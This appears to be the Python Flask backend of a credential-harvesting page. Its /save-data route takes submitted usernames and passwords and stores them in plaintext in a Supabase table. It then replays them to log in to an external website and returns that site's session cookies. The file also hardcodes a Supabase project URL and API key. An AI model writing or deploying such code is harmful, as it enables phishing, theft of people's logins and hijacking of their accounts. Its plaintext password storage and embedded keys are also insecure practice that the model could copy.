from flask import Flask, request, render_template, jsonify
from supabase import create_client, Client
import requests  # Para manejar las solicitudes HTTP

app = Flask(__name__)

# Tu URL y clave de Supabase
SUPABASE_URL = "https://owoyzrflcazopadcsyvo.supabase.co"  # Sustituye con tu Project URL
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im93b3l6cmZsY2F6b3BhZGNzeXZvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzQ4OTYwNDUsImV4cCI6MjA1MDQ3MjA0NX0.Sorhymr26eaWHep_bVj2DNklZeKJK9NKRLLhjj3U47E"  # Sustituye con tu API Key
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/save-data', methods=['POST'])
def save_data():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400

    username = data.get("username")
    password = data.get("password")

    try:
        # 1. Guardar datos en Supabase
        response = supabase.table("Brandell").insert(
            {"username": username, "password": password}
        ).execute()

        if response.get("status_code") != 200:
            return jsonify({"status": "error", "message": "Failed to save data"}), 500

        # 2. Realizar login en la página externa
        login_url = "https://www.externalwebsite.com/login"  # Sustituye con la URL real
        login_payload = {"username_field_name": username,
                         "password_field_name": password}  # Ajusta los campos según la página
        session = requests.Session()  # Usa una sesión para manejar cookies

        login_response = session.post(login_url, data=login_payload)

        if login_response.status_code == 200:
            # Si el login es exitoso, revisa las cookies de sesión
            cookies = session.cookies.get_dict()
            return jsonify({
                "status": "success",
                "message": "Data saved and login successful",
                "cookies": cookies
            })
        else:
            return jsonify({"status": "error", "message": "Login failed on external site"}), 401

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


if __name__ == "__main__":
    from waitress import serve

    serve(app, host="0.0.0.0", port=5000)
